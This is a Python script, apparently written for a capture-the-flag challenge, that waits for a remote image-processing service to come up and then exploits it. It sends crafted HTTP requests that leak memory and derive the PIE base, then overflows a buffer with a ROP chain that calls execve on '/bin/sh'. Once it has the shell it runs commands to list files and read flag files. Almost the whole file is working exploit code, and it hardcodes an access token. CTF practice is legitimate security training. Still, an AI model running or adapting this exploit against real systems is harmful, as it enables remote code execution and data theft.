#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Watchdog: keep knocking on the instance until it answers, then pwn it.

    python3 waitpwn.py [host] [port] [token] [--every 30] [--for 30]

Prints one line per attempt (time + what the server did), so a failing run
also tells you *why*: refused / closed at once / silent / answered.
"""
import socket, struct, sys, time

HOST, PORT, TOKEN = "instances.ctfcup.online", 1337, "BTG0ZSUL8I78E6C0M650RT6ZIXAS7M3Z"
EVERY, TOTAL = 30, 30          # seconds between attempts, minutes overall
W = H = 4
S = W * H * 3
BLEN = 18 + 1 + 384
LVT, LRET, PRDI, PRSI, PRAX, SYSC = 0x206db8, 0xcf7b1, 0x1cca4, 0x239af, 0x3b4aa, 0x155ed5


def req(gamma, payload):
    d = struct.pack("<BBBHHBHHHHBB", 0, 0, 10, 0, 0, 0, 0, 0, W, H, 24, 0) + payload
    d += b"\x00" * (BLEN - len(d))
    d = d[:BLEN]
    return ("POST /process HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\nX-Filter: warm\r\n"
            "X-Preview-Size: %d\r\nX-Preview-Offset: 0\r\nX-Preview-Length: 1024\r\n"
            "X-Preview-Depth: 2000000000\r\nX-Scale: 1\r\nX-Gamma: %s\r\n\r\n"
            % (BLEN, S, gamma)).encode() + d


def rd(s, wait, loop=True):
    s.settimeout(wait)
    out = b""
    closed = False
    while loop:
        try:
            x = s.recv(65536)
        except socket.timeout:
            break
        if not x:
            closed = True
            break
        out += x
    return out, closed


def attempt():
    t0 = time.time()
    s = socket.create_connection((HOST, PORT), timeout=8)
    dt = time.time() - t0
    s.settimeout(8)
    pre, closed = rd(s, 2.5)
    if closed and not pre:
        s.close()
        return "closed at once", dt, b""
    if not pre:
        # silent either way; still try the batched form
        s.sendall(TOKEN.encode() + b"\r\n")
        out, closed = rd(s, 5.0)
    else:
        s.sendall(TOKEN.encode() + b"\r\n")
        ack, closed = rd(s, 3.0)
        if closed and not ack:
            s.close()
            return "closed after token", dt, pre
        s.sendall(req("0", bytes([127 + 16]) + b"\x11\x22\x33"))
        out, closed = rd(s, 8.0)
        out = ack + out
    s.close()
    if b"HTTP/" in out:
        return "answered", dt, out
    return ("silent (%d B)" % len(out)) if out else "silent", dt, out


def exploit():
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.settimeout(8)
    pre, closed = rd(s, 2.5)
    if not pre:
        s.sendall(TOKEN.encode() + b"\r\n")
    else:
        s.sendall(TOKEN.encode() + b"\r\n")
        rd(s, 3.0)
    s.sendall(req("0", bytes([127 + 16]) + b"\x11\x22\x33"))
    out, _ = rd(s, 10.0)
    s.close()
    _, _, d = out.partition(b"\r\n\r\n")
    if len(d) < 0x100:
        print("   leak reply too short:", out[-120:])
        return False
    for i in range(0, len(d) - 0x20, 8):
        vt = struct.unpack_from("<Q", d, i)[0]
        if vt < 0x1000:
            continue
        pie = vt - LVT
        if pie % 0x1000 == 0 and 0x40000000 <= pie < 0x800000000000:
            view, temp = struct.unpack_from("<QQ", d, i + 8)
            if view and temp and 0 < temp - view < 0x1000:
                F = view + i
                print("   pie=%#x view=%#x temp=%#x filter=%#x" % (pie, view, temp, F))
                dl = F - temp
                if not 0x40 <= dl <= 0x100:
                    print("   bad layout delta=%#x" % dl)
                    return False
                b = bytearray(b"\x90" * 384)
                put = lambda o, v: struct.pack_into("<Q", b, o, v)
                put(dl, F + 0x100); put(dl + 8, pie + PRDI); put(dl + 0x10, F + 0x120)
                put(dl + 0x18, pie + PRSI); put(dl + 0x20, 0); put(dl + 0x28, pie + PRAX)
                put(dl + 0x30, 59); put(dl + 0x38, pie + SYSC); put(dl + 0x110, pie + LRET)
                b[dl + 0x120:dl + 0x128] = b"/bin/sh\x00"
                s = socket.create_connection((HOST, PORT), timeout=8)
                s.settimeout(8)
                pre, _ = rd(s, 2.5)
                s.sendall(TOKEN.encode() + b"\r\n")
                if pre:
                    rd(s, 3.0)
                s.sendall(req("0", bytes([127]) + bytes(b)))
                time.sleep(0.6)
                s.sendall(b"echo ---PWNED---; id; ls /; cat /flag /flag.txt /app/flag* "
                          b"/home/*/flag* 2>/dev/null\n")
                time.sleep(2.0)
                out, _ = rd(s, 4.0)
                print(out.decode("latin1", "replace"))
                s.close()
                return b"PWNED" in out
    print("   no filter object in leak:", d[:64].hex())
    return False


def main():
    global HOST, PORT, TOKEN, EVERY, TOTAL
    a = sys.argv[1:]
    pos = []
    i = 0
    while i < len(a):
        if a[i] == "--every":
            EVERY = int(a[i + 1]); i += 2
        elif a[i] == "--for":
            TOTAL = int(a[i + 1]); i += 2
        else:
            pos.append(a[i]); i += 1
    if len(pos) > 0: HOST = pos[0]
    if len(pos) > 1: PORT = int(pos[1])
    if len(pos) > 2: TOKEN = pos[2]
    deadline = time.time() + TOTAL * 60
    n = 0
    while time.time() < deadline:
        n += 1
        try:
            status, dt, data = attempt()
        except OSError as e:
            status, dt, data = "%s: %s" % (type(e).__name__, e), 0.0, b""
        print("[%s] #%d %.1fs  %s%s" % (time.strftime("%H:%M:%S"), n, dt, status,
                                        "  " + repr(data[:70]) if data else ""), flush=True)
        if status == "answered":
            print("[+] instance is up, running the exploit ...")
            if exploit():
                print("[+] done")
                return 0
            print("[!] exploit failed, retrying in %ds" % EVERY)
        time.sleep(EVERY)
    print("[!] gave up after %d attempts" % n)
    return 1


sys.exit(main())
